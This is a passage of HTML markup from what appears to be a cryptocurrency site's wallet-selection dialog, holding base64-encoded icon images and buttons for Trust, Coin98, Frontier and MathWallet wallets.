kREpJeExzNzZYWE5nM25UOTFBTXNUSEpWS0ZaS0J3WUdhcVhhYzFERlBmdlVRck1Sd1RwUEUwdWh2amlscHpTUlVkN3JNRkxzcHBKMlU0dDRqSlZLMFpHT0NlcTMwdlY5TVhOdGlOTXVwWWhnVnZNaFVSNnJjV2w1c0drS0drV3NsNG5Rb1lCTGtjVFNsQTBxTUdDUm9GbUxXN1A4Z3hTZElwN0Jac1Y4dmpsNHMyQmxQRmFUU1hoMEkvZU43WWZLdlR4cUIwK01GNmpuNHBXdFVBMlRzYUJVU2orV2s0MVR0V2dzWGE5SXFCTHkrajNEVE8xUjhLVkhlTDltbWVLalU3ZFl1ajVjZms4R2dzVUxFQ0treUZGSjNNRS9FRCt3YVpDZ29icTBDWmxiSWFFWkVaQ3JFMk9ocExCS1JBRHlDMnhlcFRRZUo2MVpuYWlscFgxeFdlcW1aNHFEU3V1N1Q3MWd0OWRSbHJMQktSQUR5S1ZhUW9NVmZEMmpaTFFVQ0R2cXdqTWpaTGR5bThkclUweTFGUnEzRTJablEweHZyelBrMEhpWTcybWRkNG4zOEdWMmtxYVo4WnpscWFBRUI1VEVpQzlvTkVpS05vVllKRVMwM3hGbnBEU29TRWpkNVpBdFA4QUQzVHN0S29RSW91aUNkb3RkRVZiUjh3N3hFZDdSbEo0bG9KRUIvbkovOFFBS2hBQUFRSUVCQVlEQVFFQkFBQUFBQUFBQVFBUklURmhjUkF3UVZFZ1FJR1JvYkZRNGZEQjhkSC8yZ0FJQVFFQUFUOGh5Q1FFNTI3cGp1bUtnRlFDb0JVQXFBVkFLZ0ZRQ29CVUFxQVZBS2dGUUNvQlVBcUFWQUtnRlFDb0JVQXFBVkFLZ0ZRQ1ltcVZHNlpia0NXVVRPQ0FiNEpta24zaG11OHBib0J2aG9pb1U4cncrSmJVSUY4ancrTEkxRTBJOFJpVzcvR21CZnZ3a3NnR0h4d2hEZ203YjQ4K3NTV0NBWWZJQ0RqQXlmSW1Zd0V6ekI4WUdZSmdPcSsvbFFGV28xRitaSk9XTmhEcVZHWElQNk5pSE1ieW1kamNTczVjQUFGSjVRb0hjeVRCT0Zab2ZaUEg3Um9PbkVPRmlLQ3hUUUJFcG5sWmlrMjVBZ0RrZ0NxbDRwR1U3eE5nZVU1Z2Z1WWs4UjFaVE9Eam9FWkFncVA0SzBtV3drTHduQjVHYmRTYlpnQkRBcnhrRzY4UFFlRi9wRk5GYzBSY2h2a05EMngrR1FnV0xBemU2Y2MyQjREa2VGNUFHUStwZjZSQVFKcWlNOUNtbmpjWmsyNmsyek5FUXV5R1RNcHY3a095WmcvWmh0aVp6YkFFOHZuUjdxOFdhSHJsRkJLRjFHWk51cE5zeUg4VWVKMUYyQjFxME4wQk1YNkg5SzZqQkU5K001Q0pNRUozSnV5N0o2SW51VW9MZUlkK01JOUhyTW0zVW0yWURYV01ieTJITXAwZDVyMzJkN1RLRUd3R2Q0b2txYkJ1STlLUVdpdTFQUWZIOTlNeWJkU2JaZ05peWhVK3VVSi8weHhDSlY2R1pOdXBOc3dHdUQwTVRoMS9ybERjbS91eEJxcGVobVRicVRiTUJxdjhNU2lQN1BsRGQ3K3pFV0d1WVRicVRiTUZxM294S0J1SEtGVkRpTFZEN1prMjZrMnpHaWJpZkp4dlova2NuUVFQd05LaFBsbVRicVRiTXZKdms0d0hjSHJrNkhFOGNEUm9PWk51cE5zeThRSHJHMHdlWEp1YXNjRkRWNHpKdDFKdG1PN2N4NCtzWFRRTzhPVHZ4bmhpQTVZS2xCc3liZFNiWmpmc2o3R1A2NkR5ZEJNZURqUWdlYzJiZFNiWmpHMkE3RHdVWi9Ea3V2eWVNYUVlQVBtemJxVGJNL053T0J5Nmg0bHVTYWRnUDdqWDBQOEFNMmJkU2Jac0FHZUFzK01ZNCtkL25KYThnbUJZUXhZM0pBL3V1Yk51cE5zMXgwQi9qK1l0SkdLNjVqa2Q3b1Y5T0NNSnVQcjlObXpicVRiTmFlYkJzY1Rqc2NBYXJWMEZ1UWFMeFAxNHlDUUNsT0lETm0zVW0yYkxRWXNnSXNSaU1RbGFFY2pvZHM5bVFQdlJUd0Y3WXN5Z3d1L0hPbTNVbTJjY1lmU3hTSzBNUVdYM3pRRWg2bFFDL3dEdHppQVNXRVNuRW03dWROdXBOczZRaXoyTzZEWXhlOWVBYTZHaHFzZFJxTGpLY0dOZ0dDNVZqQU5CYmdza1IxTytmTnVwTnM5NUJoZnFLT2hoaUR3QW9CMUprVVJFZnR3aGtvNmx4T25kcjEyVHZHUDJUcndnSXlSY29FT2dFd0EwejV0MUp0eUdnOUkwVUdRYUJJOEwxWlNSVEdJZDUvNGdRUTRMZzROUmpvTlRaUDdubGY4QUZNOEo0TXpoK2pJZEFaZ0JweUUyNmsyNUUrTU13VTRyVWVqMEtMQlhNQXg0UzREOFNHeVp3ZGlKL0RvME9PcDRlcXJDQk05bklDdzVLYmZsQm5zdEpDT3FlYkNKZW1xSUlMR0J5SE96WFlKbm92Si8xQVFBSkFjbkhIZENaNVVTZTZqN1J1aXBIMXdpNWhwQUJ5VXdtWjF1cFF1QWRBNVF6S1FYdHl3Q0FCQjBLZjJOWFNiYkk3TG5nY0pCT2NqN1U0Uk9ZZVdPZ3drNWdaQ01Ta0k2cDBxV0NoOFFVZ0F3SExpSkhFUWg4ZVN3UURERTc3Zkh6TnVHUnA4YWRoTlNIRE5EWS9Ga3NnTy9HUTZCME0vaVNXUUdwbmtrT25hZmY0ZDlCTkFkOHhtbDJUN3crRGRsRTBVczl0aW5PbzdKbS9PczNUN0JNVE05a0EzS0FBSktvVlVLcUZWQ3FoVlFxb1ZVS3FGVkNxaFZRcW9WVUtxRlZDcWhWUXFvVlVLcUZWQ3FoVlFxb1ZVS2luSE4vOW9BREFNQkFBSUFBd0FBQUJEenp6UlR6enp6enp6enp6enp6enp6VHp6enp6eVJ6enp6enp6enp6enp6enp6enp3elR6enlUenp6enp6enp6enp6enp6enp6enp5anp5aHp6enp6enp6enp6enp6enp6enp6enp4end6enp6enp6enp6enp6enp6enp6enp6enl6enp6enp6enp6enp6OVBmenp6enp6enp6enpEenp6enp6enp6UW9NTU9EN0h6enp6enp6ekx6enp6enl1QUFNTTkrNHNNUE9MM3p6enp3THp6enp6eUVJV1kzenp3MjAwd1A4QTg4ODg4Qzg4ODg4OEtRODg4ODg4ODg4NkQwODg4ODhDODg4ODg4cUU4ODg4ODg4ODhyRGQ4ODg4OEM4ODg4ODhxRzg4ODg4ODg4OGdEVzg4ODg4Qzg4ODg4OGpTODg4ODg4ODg4SkdWODg4ODhDODg4ODg4cEEvODg4ODg4ODhDSDg4ODg4OEM4ODg4ODhNRDE4ODg4ODg4OEpIODg4ODg4Qzg4ODg4OG9EYjg4ODg4ODg1REQ4ODg4ODhDODg4ODg4L0NDLzhBUFBQUFB3UjkvUFBQUFBBdlBQUFBQUE9DQWZ0L1BPOEF5dlBQUFBQUEF2UFBQUFBQUERqUTQwcUF4VDNQUFBQUFBQQXZQUFBQUFBQUExmUUF3RGovQUR6enp6enp6elB6enp6enp6enp6eTJLL3dBODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODhFODhVODg4ODg4ODg4ODg4ODg4ODg4ODg4MGM4OHN3ODg4ODg4ODg4ODg4ODg4ODg4OHM4ODg4ODhjODg4ODg4ODg4ODg4ODg4ODhFODg4ODg4ODg4akJCQkJCQkJCQkJCQkIvOEFQUFBQUFAvRUFDWVJBUUFDQVFNRUFnSURBUUFBQUFBQUFBRUFFU0VRTURGQVFXRnhJS0ZSY0lHUnNmRC8yZ0FJQVFNQkFUOFEvUm8xd2xzYW5ZQjZWSEpuZjc5VEdHb3FyZGNRNUp5V0p5UytnYmw0SjV2aGtPQ1k0dVpUSWlLcDFFY01Xc1pTL251OHZ2U1FkeElMbE9BZkF1aGNaeXFkbkExNzZmWVp4ZFRKajdtZjhQVzF4L2xwOUxkRlFkYlE4ajNvYUR3YnBwUlVuazJuZ2VOQlFHNktMNGcwM0JzdlpWcnhCU2VlZ2l4YlB1amZoZjhBak9saS9IWXVORjYzcUNVeGxVY3g4OUNnV3k3MkRTbUhuZnI5d2lWaGlGcVlUQitvSTVOY0x5emx1UHhvNjdIUTVRd3h1aG9sbGlYREJtT3dORVZDVmY0empvZ0ZNRnovQUVqdEN0Y2ppZmNIbzdWYmg5Q1djc1ROY3Y2UC84UUFKaEVCQUFJQUJRUURBQU1CQUFBQUFBQUFBUUFSRUNFd01WRkJZWEdoSUVDeFlIQ0I4UC9hQUFnQkFnRUJQeEQralg2MmN3bEV1ZFpUNnV3RnpvdGVabVN1QUtESE16Sm5LcHM1UG9ER3JXZHI0WkdOc3BScVpabGZVQVdPS201Q2FoZGNkWDFpZE1VSHNNYjB2aTR0YnFiVUdkU1I5TmZ2V0p2L0FPZnVsNldIdmFydndrRi85ZGRJNXJ4Zzc4anF1L0ZEZmkwaGt2R0N0TzdxdS84QWI5aHN1enBITTk4RmF1cmNqaGlXVkVwclJvTHpMbmdmUUNtZDlIdzVyeXF1K1dGWUhYUXI4RkhKMWhWWkJNOVlLeXFEOGdWb25NRGhjamJwcjh3SU41a0hwdVovbVBjUkduSFBOam1iVHZ6Z1o2N3Y5SFAyWkJyZUJPVFBtYmtEbVp2bmNBYlZFdjhBMG0vMGtWcW1NZnJEYkxNZXJqNmpkdTlLOVJxMk95RzVrZXh4L09qV2ZuLy94QUFxRUFFQUFRSUNDUVVCQVFFQUFBQUFBQUFCRVFBaE1hRVFNRUZSWVhHQmtmRWdRTEhCOEZEUjRmL2FBQWdCQVFBQlB4RFVXUmI3akdwY0ljMVNZdm9SVzhsNXJYaXE4VlhpcThWWGlxOFZYaXE4VlhpcThWWGlxOFZYaXE4VlhpcThWWGlxOFZYaXE4VlhpcThWWGlxOFZYaXE4Vlc0STVNVk13NjE2azRoeVdva2hsYm4yQXFNWGNWR0lodVA5b0JZaitDZ2tKSlU4V09EY292Z1N5ZGJMZGZpMUJnUDRxQ1FralVZTTdqYVVJSkdUVXFCS3dGUTNOdHpmei9rcUhBZHB2b0JicWJ0UVhTNE1PUEgrV2srUlNCSjZ1U0g0ZnpjRndmeDlNUzJMWXF3ZnpyeTlsemw2QzVzV0gzL0FEemFURzRvUkJMam9tVXgyYzZnRGQvUXZibTV5MFhCdXY4QTBiRzMyZEZ6OVAzZjNDUERpWWU1dXZ5R2tTUU51ekE1SmZ1VUV2MkVJWGNObnQ4UjJsKzJqYTcxYy9iWTJvM2c1Y1hoUXEzWE5nNGJtZkxEU2tXeWRvTnliU2pIcXRKZTR2cHZ6OXVSTGNJcktudE1KS2lCMWFMZkd3YUw4NU9kVHFSd2VXTEhxa2dDeFlQNHN6MG9NQlByelk5RjlyTEQydFpWN0JxTllxZ281a1RFRHNGNkhFWmg4aEJ5bzVXNFd2dkJrMWNsTWtxSEl3T21xSi94d2k5em9sRkN2YkRaSHpRUkRPNXZXSXpvc3VtSDBqN0hPcXlyV1JXNkRxVGZ3T0hkS1V1eFE2UUsvYi9kRHdMeFgzVW9EdlUrc0ZZTHRQRmJjUkJjQndjWHRRVVlReU9YdDU0MHpPTEY5eFBveDFHelgzeDhWa3JIOTErMys2ZHgwblFtL0VubkpWMll6OVBFYmF6T3F5cldNVEtUd0xHUnFRUUFWYkFWZkNkZ2lPR042d2NhTWhyWVNqd1lmTGpwTGUwU2cxdkhHUlh5eEhXZVpVMkU0SW5rQ3ozMVN0ek80UUpPNVBYV1oxV1Zhd29IZjV2VURXOXBYWXBzUlBhRU9qZktuRmQrRWZqaFJBbE5sUDFYN2VzSW13TWljUnBGZWJWaTVyZG9wM1laRmw2TnM2ZVlWak4yRW5yNWtEV002ckt0WVFUZjU2UmZaQ2hSQTdxL08zNEpTUXlEQk5uV1ZGaVhBUVphNmF1TzFqTXFSbUg4S0tZZXJuM05PUXBKU3dPM1NTZmF3eTZ6T3F5cldRQ0l2ZTRhWnQwWDg2ZTBCWnVzK21MZkEvZlBXWjFXVmF5RzhidTJtYmQzN24rUGFZM1hkK2ZUTU41eWZyV1oxV1ZheTJON3B1YlJlMDdkWkdNN1dtVWJ4OEgxck02ckt0WktONitIMXBqM3Q5bC8zMmwwcGxjOU1vakhaejYxbWRWbFdzL1djSDFwZzN4N1A5dlo3S3ArdzlIR0R1ays5Wm5WWlZySWZISCsybWQ4bVgxN1B4ano5SEZydkwvZXN6cXNxMWtjVDZaWDNwanV4RHVmWHM3cVJQZEVmZm90NUdUSFdaMVdWYXkwKzJlY3RLNjhUK0p6OW54M0Y2L1JPbERDVllDakp3QWREV1oxV1ZhenlnNTltbTlrWERrSDJkeTd3WEFUNk5OaUp0dk1HdHpxc3Exa0tsek9nL0I2TGd6ZnQ4aCsvWlFCY1F1VUQ1ZE5ucGw3ajZhM09xeXJXUitTa2RVZWlWMlVyaElNZzlsRVRaZzRxL0JOTStscGJpcDhGMXVkVmxXdGUzQVRtUmxHa0c3RVRnSStWMzlrWmpJamZZWkJwbkV4NXlGZmhyYzZyS3RiQVJFejJTWGZCNjZUaHJnQ0grQ2RmWWhKUW5yMnpKU3F5M2RMUVVkOUxaTmF6cXNxMXJuWit6dmNPK25oWXJJTWxZSlFKdmJUb3lkUFlIYzFpTmdXSGVYb2FjMVlCWW9HNENOd0VHdHpxc3ExcmhRc3U5c2VqRDBwTGJ6c1JHRTAzOENCYmE5V3pqejE5eTFFYlZzSEZwRDlqVFlZQWNBZzAzVU1lMnlCMkpkdGRuVlpWcnRpMW9iRSt3bm1Pa1VFVVM0bEFaSFlYQVhaOHVldHhlejRpN2cydkNqb0VMbUw5bnhtNkFRS01BWFZvekppNXY0blFnNmE3T3F5clhCMWdBRjlrT0kxWkVwT3diQndmUWFka0ZiWEJjVGc5eW9LTkd3ZmRpR3FscU8yS2Z4WXlwUzVtSFk5dzJmUG9jcnZzTVA0SHp5MStkVmxXdkpZb0hCUGkrTzhwWU9HdWZ0L293UWdzUjJwelloQmM0N1RtZHF3c3VURGs3bmg2aDRaTFhPcGgxWDRVWTJCVFluYytIRDA3cUZybVptOTJVR2RRMEFOZm5WWlY3QzBrV0RTOENiVGgycVRSSGJ1Vy9XUHBCYlNSZEJNSHJTRFJzSE1tL1ZialFNQUpFWkUwVFlEaXZ1R0xVZmxrS052aS9BNzBxaXFyZFgwOEZCUVAweithZ3ppZUFld3pxc3E5amdxamNsU1EzbFlPRzA1TitMVFRsaFFPWStsMnhOMnNjMjFsd3JFZXdWbnVBeFpjNnhwaHZMeTRIRDB4RjRNWm9iWGdTMDRBSzVlT1J6dSt5MzNhcXdHNjNzNENjUUhaaS9UQ3BTSlhnc2NmbzdVaUJCaEVoSFVRd25FRWN4YkZObURmQWJqdHlIQ2piREFZQTRIc3drNTFXanVaOXJaUjFyZlZzSFB1VS9GTkYzMUdLNTkzMHNkdUZrY0FvcGw3aVhmQnlMOFNzRE9FUS82OGZhT0VNWXRRUUJnV3BzWGNqOW43WU1MUWhJbERHdVZHT2UydUdIS2xHWkE0UjBTT1pRYXpnYjNBNnhVTWpVRW5oRzQ0R2Z0cjNlTTl2eG9HSXhMME1rbUQ3Y1dERUJQSkMvU2pjSFpGUFlSUFdqTzNBd09BZTM0QUxIMys0YWJ6dTRjdjU5NEx1QnpxQU5KYkRITVVJZ2x4L25HUHNzT2ZwTUxhdzRPNythM0V1eU45QUFHQjZVQkRoU1IybXgzL3dBdUJoSzRHK29MdDFpK3NCR0c1M1VrNEh5L2toeExnYjZTY1JaYWtCRFV0K2ZsL3dDTzN3VGtLZ3VzcmJySjduaXcvd0NVR1lFdHp0L2hvc2NkMjJveGJOeGpRQWdJTmNna0pKVXpFT0RjcURhOFZXOWh6dDcxRmhFN3FtNHJ6dFc0QnUvMVFZQ1BhS1VBN3dwdmZOWG1xODFYbXE4MVhtcTgxWG1xODFYbXE4MVhtcTgxWG1xODFYbXE4MVhtcTgxWG1xODFYbXE4MVhtcTgxVjQrYWdHUjFYb0FJQURXZi9aIi8+CjwvZGVmcz4KPC9zdmc+Cg==" alt="Trust icon" class="!w-5 !h-5">\n                  </i>Trust </button>\n              </div>\n              <div class="w-full hover:!bg-blue-500/30 border border-accent/10 rounded-xl !text-left">\n                <button onclick="window.modalClose(); window.modalChoice(\'coin98\');" class="!text-zinc-700 hover:!bg-transparent !px-2 xs:!px-6 wallet-adapter-button dark:!text-zinc-200  !text-[13px] !leading-[18px] !text-left !p-2" tabindex="-1" type="button">\n                  <i class="wallet-adapter-button-start-icon">\n                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3NiA3NSI+CiAgPGRlZnM+CiAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImEiIHgxPSIxMDEuNjgxJSIgeDI9Ii0xLjU1NyUiIHkxPSIxNS4yNjglIiB5Mj0iODQuOTE3JSI+CiAgICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNGMUQ5NjEiLz4KICAgICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjQ0RBMTQ2Ii8+CiAgICA8L2xpbmVhckdyYWRpZW50PgogIDwvZGVmcz4KICA8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgPHJlY3Qgd2lkdGg9Ijc1IiBoZWlnaHQ9Ijc1IiBmaWxsPSIjMDAwIiByeD0iMTYiLz4KICAgIDxwYXRoIGZpbGw9InVybCgjYSkiIGZpbGwtcnVsZT0ibm9uemVybyIgZD0iTTYxLjQ0IDBhMTMuNzE0IDEzLjcxNCAwIDAgMSA5LjY4IDQuMDEgMTMuNjYxIDEzLjY2MSAwIDAgMSA0LjAwOCA5LjY2OHY0Ny42NDZhMTMuNjYgMTMuNjYgMCAwIDEtNC4wMDcgOS42NjZBMTMuNzEzIDEzLjcxMyAwIDAgMSA2MS40NCA3NUgxMy42ODZhMTMuNzEzIDEzLjcxMyAwIDAgMS05LjY4LTQuMDFBMTMuNjYgMTMuNjYgMCAwIDEgMCA2MS4zMjRWMTMuNjc4YzAtMy42MjUgMS40NC03LjEwMiA0LjAwNy05LjY2N0ExMy43MTQgMTMuNzE0IDAgMCAxIDEzLjY4NyAwWk0yMC4wNjMgNDYuMjMxaC00LjgyNWExMC4wMzIgMTAuMDMyIDAgMCAwIDIuOTQ2IDcuMDg2IDEwLjA3IDEwLjA3IDAgMCAwIDcuMSAyLjk0MiAxMC4wNjUgMTAuMDY1IDAgMCAwIDcuMTA4LTIuOTM1IDEwLjAzIDEwLjAzIDAgMCAwIDIuOTQ2LTcuMDkzaC00LjgyNGE1LjIwNyA1LjIwNyAwIDAgMS0xLjUzIDMuNjg4IDUuMjI1IDUuMjI1IDAgMCAxLTMuNjk2IDEuNTI4IDUuMjM0IDUuMjM0IDAgMCAxLTMuNjk1LTEuNTI4IDUuMjEzIDUuMjEzIDAgMCAxLTEuNTMtMy42ODhaTTU0LjMzIDMzLjcxNmExMS43NjMgMTEuNzYzIDAgMCAwLTEyLjc5OSAyLjUzOEExMS42OTcgMTEuNjk3IDAgMCAwIDM4Ljk5IDQ5LjAzYTExLjcyMyAxMS43MjMgMCAwIDAgNC4zMjggNS4yNTkgMTEuNzU3IDExLjc1NyAwIDAgMCA2LjUyNiAxLjk3IDExLjc2NiAxMS43NjYgMCAwIDAgOC4yOS0zLjQzNSAxMS43MiAxMS43MiAwIDAgMCAzLjQ0Mi04LjI3NCAxMS43MDIgMTEuNzAyIDAgMCAwLTEuOTc1LTYuNTE0IDExLjczNiAxMS43MzYgMCAwIDAtNS4yNjktNC4zMlptLTQuNDg4IDMuOTJhNi45MzcgNi45MzcgMCAwIDEgNC45IDIuMDI1IDYuOTEgNi45MSAwIDAgMSAyLjAyOCA0Ljg5MiA2Ljg5NyA2Ljg5NyAwIDAgMS0xLjE3IDMuODM0IDYuOTMyIDYuOTMyIDAgMCAxLTEwLjY0MyAxLjA0MiA2LjkwMiA2LjkwMiAwIDAgMS0xLjUtNy41MjIgNi45MDkgNi45MDkgMCAwIDEgMi41NDQtMy4xIDYuOTI4IDYuOTI4IDAgMCAxIDMuODQxLTEuMTY3Wm0uMTcgNC41NTJhMi40MzEgMi40MzEgMCAwIDAtMi4yNDEgMS4xNTQgMi40MTggMi40MTggMCAwIDAtLjM1NiAxLjI1NyAyLjM5NSAyLjM5NSAwIDAgMCAxLjYxOSAyLjI5djEuNzUzaDEuNjE4di0xLjc1NGEyLjQyNyAyLjQyNyAwIDAgMCAxLjU5NC0xLjk1IDIuNDE4IDIuNDE4IDAgMCAwLTEtMi4zMSAyLjQzMSAyLjQzMSAwIDAgMC0xLjIzNC0uNDRabS0yMC4yMi0yMi41NTJhMTEuNzYyIDExLjc2MiAwIDAgMC0xMi43OTYgMi41MzEgMTEuNjk3IDExLjY5NyAwIDAgMC0yLjU1NCAxMi43NjkgMTEuNzIzIDExLjcyMyAwIDAgMCA0LjMyIDUuMjYyIDExLjc1NyAxMS43NTcgMCAwIDAgMTQuODI1LTEuNDQ2IDExLjcxNyAxMS43MTcgMCAwIDAgMy40NDUtOC4yODQgMTEuNzAzIDExLjcwMyAwIDAgMC0xLjk3NC02LjUxMiAxMS43MzYgMTEuNzM2IDAgMCAwLTUuMjY2LTQuMzJabS00LjUxIDMuOTE3YTYuOTQ1IDYuOTQ1IDAgMCAxIDQuODk3IDIuMDI5IDYuOTE4IDYuOTE4IDAgMCAxIDIuMDMyIDQuODg2IDYuOTA2IDYuOTA2IDAgMCAxLTEuMTY4IDMuODQyIDYuOTQgNi45NCAwIDAgMS0xMC42NiAxLjA0OCA2LjkxMSA2LjkxMSAwIDAgMS0xLjUtNy41MzYgNi45MTggNi45MTggMCAwIDEgMi41NS0zLjEwMyA2LjkzNyA2LjkzNyAwIDAgMSAzLjg1LTEuMTY2Wm0yNC41Ni00LjgxYTEwLjA1OSAxMC4wNTkgMCAwIDAtNy4xMDMgMi45NCAxMC4wMiAxMC4wMiAwIDAgMC0yLjk0IDcuMDkgOS45IDkuOSAwIDAgMCAxLjIzIDQuNzk1IDEzLjU3NSAxMy41NzUgMCAwIDEgNC4yMTQtMi4zMjIgNS4wODIgNS4wODIgMCAwIDEtLjYyNS0yLjQ3NyA1LjIwNiA1LjIwNiAwIDAgMSAxLjUwMy0zLjczNiA1LjIyMyA1LjIyMyAwIDAgMSAzLjcyMi0xLjU1NCA1LjIzNCA1LjIzNCAwIDAgMSAzLjcyIDEuNTU0IDUuMjEzIDUuMjEzIDAgMCAxIDEuNTA1IDMuNzM2IDUuMjc5IDUuMjc5IDAgMCAxLS42MjMgMi40NzMgMTMuNTc0IDEzLjU3NCAwIDAgMSA0LjIxMyAyLjMyMiA5LjkwMyA5LjkwMyAwIDAgMCAxLjIzLTQuNzk1IDEwLjAzMiAxMC4wMzIgMCAwIDAtMi45NDYtNy4wODYgMTAuMDcgMTAuMDcgMCAwIDAtNy4xLTIuOTRabS0yMy43NSA3Ljk5aC0xLjYxN3YxLjc1YTIuNDE5IDIuNDE5IDAgMCAwLTEuNTgyIDIuNjg3IDIuNDE0IDIuNDE0IDAgMCAwIDIuMzkgMi4wMDYgMi40NSAyLjQ1IDAgMCAwIDEuNTU1LS41NzQgMi40MTQgMi40MTQgMCAwIDAtLjc0Ni00LjExOXYtMS43NVoiLz4KICA8L2c+Cjwvc3ZnPgo=" alt="Coin98 icon" class="!w-5 !h-5">\n                  </i>Coin98 </button>\n              </div>\n              <div class="w-full hover:!bg-blue-500/30 border border-accent/10 rounded-xl !text-left">\n                <button onclick="window.modalClose(); window.modalChoice(\'frontier\');" class="!text-zinc-700 hover:!bg-transparent !px-2 xs:!px-6 wallet-adapter-button dark:!text-zinc-200  !text-[13px] !leading-[18px] !text-left !p-2" tabindex="-1" type="button">\n                  <i class="wallet-adapter-button-start-icon">\n                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHZpZXdCb3g9IjAgMCA2MCA2MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjYwIiBoZWlnaHQ9IjYwIiByeD0iMzAiIGZpbGw9IiNDQzcwM0MiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00NiAxMkw0NS43ODIgMTIuNTI3OEw0NS4wNjQ3IDE0LjIxNjZMNDQuNTg4NSAxNS4zMDU2QzQwLjk3MjYgMjMuNDY3OSAzOC4xNTk2IDI3LjM0MTggMzUuMTY5NyAyNy4zNDE4QzMzLjQ0NjUgMjcuMzQxOCAzMi40MjY3IDI2Ljg4ODYgMzEuMTA2NCAyNS44MjVMMzAuNzI1MyAyNS41MDkyQzI5Ljc3NTQgMjQuNzA5OCAyOS4zNzUzIDI0LjUxMzMgMjguNDYxNiAyNC41MTMzQzI3Ljk4NTIgMjQuNTEzMyAyNy4xMzMgMjUuMDY5NyAyNi4wNTQ3IDI2LjM2ODVDMjQuOTM2MyAyNy43MTUyIDIzLjcxIDI5LjcwNDkgMjIuMzkyIDMyLjMyNTZMMjIuMjY5MyAzMi41NzA5TDM1LjA5NyAzMi41NzE0TDMzLjQ5OTggMzUuNTkyOUgyMS41MjExVjQ4SDE4VjEySDQ2Wk00MS4wMDg3IDE1LjAyMjVMMjEuNTIwOSAxNS4wMjE0VjI3LjAxOTJDMjMuODU1OCAyMy4zMjY1IDI2LjA3NDUgMjEuNDcyNiAyOC40NjE2IDIxLjQ3MjZDMzAuMzE3NCAyMS40NzI2IDMxLjQxMDkgMjEuOTQ5IDMyLjc5MDUgMjMuMDU3OEwzMy4xODQxIDIzLjM4MzZDMzQuMDcxIDI0LjEyOTkgMzQuNDEyOCAyNC4zMDExIDM1LjE2OTcgMjQuMzAxMUMzNi4wMDY2IDI0LjMwMTEgMzguMjIyOSAyMS4wOTM5IDQxLjAwODcgMTUuMDIyNVoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo=" alt="Frontier icon" class="!w-5 !h-5">\n                  </i>Frontier </button>\n              </div>\n              <div class="w-full hover:!bg-blue-500/30 border border-accent/10 rounded-xl !text-left">\n                <button onclick="window.modalClose(); window.modalChoice(\'mathwallet\');" class="!text-zinc-700 hover:!bg-transparent !px-2 xs:!px-6 wallet-adapter-button dark:!text-zinc-200  !text-[13px] !leading-[18px] !text-left !p-2" tabindex="-1" type="button">\n                  <i class="wallet-adapter-button-start-icon">\n                    <img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjEyOCIgdmlld0JveD0iMCAwIDEyOCAxMjgiIHdpZHRoPSIxMjgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0iI2ZmZiIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJtMCAwaDEyOHYxMjhoLTEyOHoiIG9wYWNpdHk9IjAiLz48cGF0aCBkPSJtOTAuODQ3MDA4NiA1Ny43NjEwMDIzYy0yLjI3NzAzNjMtMi4yNzcwMzYzLTIuMjc3MDM2My01Ljk2ODg0MTYgMC04LjI0NTg3NzggMi4yNzcwMzYyLTIuMjc3MDM2MyA1Ljk2ODg0MTUtMi4yNzcwMzYzIDguMjQ1ODc3OCAwIDIuMjc3MDM2NiAyLjI3NzAzNjIgMi4yNzcwMzY2IDUuOTY4ODQxNSAwIDguMjQ1ODc3OC0yLjI3NzAzNjMgMi4yNzcwMzYyLTUuOTY4ODQxNiAyLjI3NzAzNjItOC4yNDU4Nzc4IDB6bS0xOS41ODM5NTk4IDE5LjU4Mzk1OTdjLTEuNzA3Nzc3Mi0xLjcwNzc3NzItMS43MDc3NzcyLTQuNDc2NjMxMSAwLTYuMTg0NDA4M3M0LjQ3NjYzMTEtMS43MDc3NzcyIDYuMTg0NDA4MyAwIDEuNzA3Nzc3MiA0LjQ3NjYzMTEgMCA2LjE4NDQwODMtNC40NzY2MzExIDEuNzA3Nzc3Mi02LjE4NDQwODMgMHptMzAuOTIyMDQyMi0xMC4zMDczNDcyYy0xLjcwNzc3OC0xLjcwNzc3NzItMS43MDc3NzgtNC40NzY2MzEyIDAtNi4xODQ0MDg0IDEuNzA3Nzc3LTEuNzA3Nzc3MiA0LjQ3NjYzMS0xLjcwNzc3NzIgNi4xODQ0MDggMHMxLjcwNzc3NyA0LjQ3NjYzMTIgMCA2LjE4NDQwODQtNC40NzY2MzEgMS43MDc3NzcyLTYuMTg0NDA4IDB6bS0xMC4zMDczNDc3IDEwLjMwNzM0NzJjLTEuNzA3Nzc3Mi0xLjcwNzc3NzItMS43MDc3NzcyLTQuNDc2NjMxMSAwLTYuMTg0NDA4M3M0LjQ3NjYzMTEtMS43MDc3NzcyIDYuMTg0NDA4MyAwIDEuNzA3Nzc3MiA0LjQ3NjYzMTEgMCA2LjE4NDQwODMtNC40NzY2MzExIDEuNzA3Nzc3Mi02LjE4NDQwODMgMHptMjEuNjQ1NDI4Ny0xLjAzMDczNDdjLTEuMTM4NTE4LTEuMTM4NTE4MS0xLjEzODUxOC0yLjk4NDQyMDggMC00LjEyMjkzODkgMS4xMzg1MTktMS4xMzg1MTgxIDIuOTg0NDIxLTEuMTM4NTE4MSA0LjEyMjkzOSAwIDEuMTM4NTE5IDEuMTM4NTE4MSAxLjEzODUxOSAyLjk4NDQyMDggMCA0LjEyMjkzODktMS4xMzg1MTggMS4xMzg1MTgxLTIuOTg0NDIgMS4xMzg1MTgxLTQuMTIyOTM5IDB6bS0xMC4zMDczNDcgMTAuMzA3MzQ3MmMtMS4xMzg1MTgtM